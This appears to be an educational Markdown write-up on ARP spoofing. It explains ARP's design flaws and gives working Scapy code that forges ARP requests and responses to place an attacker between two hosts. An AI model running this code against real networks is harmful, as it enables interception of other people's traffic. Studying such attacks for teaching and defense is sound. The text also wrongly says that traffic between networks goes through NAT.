# ARP Spoofing

First of all, let's discuss ARP briefly. ARP stands for Address Resolution Protocol (don't say ARP protocol because ARP already includes protocol :sweat_smile:).

Inside a network, hosts communicate using MAC addresses. Communication between different networks is carried out through Network Address Translation (NAT). ARP is used to get a particular host's MAC address with their IP address.

ARP includes two types of operations:

1. **Request**: The host wants to know the MAC address of another host through it's IP and asks everyone whether they have this particular IP.
   - ![ARP Request](https://i.imgur.com/2hAM9tz.png)
2. **Response**: The host with the IP corresponding to a request responds with its MAC address.
   - ![ARP Response](https://i.imgur.com/OoCQ6nV.png)

### Attack

Fundamentally, ARP is flawed, but we don't have a choice.

- It is not possible to verify whether a particular packet came from a host other than checking the header.
  - Crafting a malicious packet is very easy.
- If the host receives a ARP reply, it updates the ARP table even if it has a valid entry.
  - Attacker can repeatedly send malicious packets to keep on updating the victim's ARP table and make the attack persistent.
- If a host sends an ARP request, the responding host updates it's ARP cache for the asker's IP to asker's MAC.
  - More about this in [Request Spoofing](#request-spoofing)

We can implement digital signatures to solve the first problem and a timeout for the second issue. But the thing is, ARP is used on very low-end and high-end CPUs alike. So, If we have to propose a solution to this, the solution must not modify existing protocol. (_Backward compatibility_)

Based on the above flaws, there are several variations to take advantage of this protocol.

### Request Spoofing

![Request Spoofing](https://i.imgur.com/cd7F1Ul.png)

The hosts updates it's ARP table even for the ARP requests. Hence, If an attacker sends a fake request to a host, the host updates it's ARP table and sends an ARP response.

```python
# attacker pretends as victim 1 and asks for victim 2's MAC
pkt1 = scapy.Ether(src=attacker_MAC, dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(
    op=1,
    hwsrc=attacker_MAC,
    psrc=victim1_IP,
    pdst=victim2_IP,
)

# attacker pretends as victim 2 and asks for victim 1's MAC
pkt2 = scapy.Ether(src=attacker_MAC, dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(
    op=1,
    hwsrc=attacker_MAC,
    psrc=victim2_IP,
    pdst=victim1_IP,
)
```

And by repeatedly sending these packets, victim 1's ARP table has the entry, h2_IP:Attacker_MAC and victim 2's ARP table has the entry, h1_IP:Attacker_MAC. In otherwords, Attacker sits in the middle of h1 and h2 in the further communications. Every message between h1 and h2 must pass through attacker. By turning IP forwarding on, Both hosts can communicate as usual, since attacker forwards the packets to the required host. [Code can be found here](arpspoof_request.py).

#### Demo

![Demo](https://i.imgur.com/oZonhAO.png)

### Response Spoofing

![](https://i.imgur.com/OKr0EPN.png)

Similar to ARP Request, we send spoofed response packets to the hosts.

```python
# attacker pretending as victim 1 and answering to victim 2
pkt1 = scapy.Ether(src=attacker_MAC, dst=victim2_MAC) / scapy.ARP(
    op=2,
    hwsrc=attacker_MAC,
    psrc=victim1_IP,
    hwdst=victim2_MAC,
    pdst=victim2_IP,
)

# attacker pretending as victim 2 and answering to victim 1
pkt2 = scapy.Ether(src=attacker_MAC, dst=victim1_MAC) / scapy.ARP(
    op=2,
    hwsrc=attacker_MAC,
    psrc=victim2_IP,
    hwdst=victim1_MAC,
    pdst=victim1_IP,
)
```

We're sending two packets in which we're setting the fake source address.

#### Demo

![Demo](https://i.imgur.com/Oo14zX4.png)
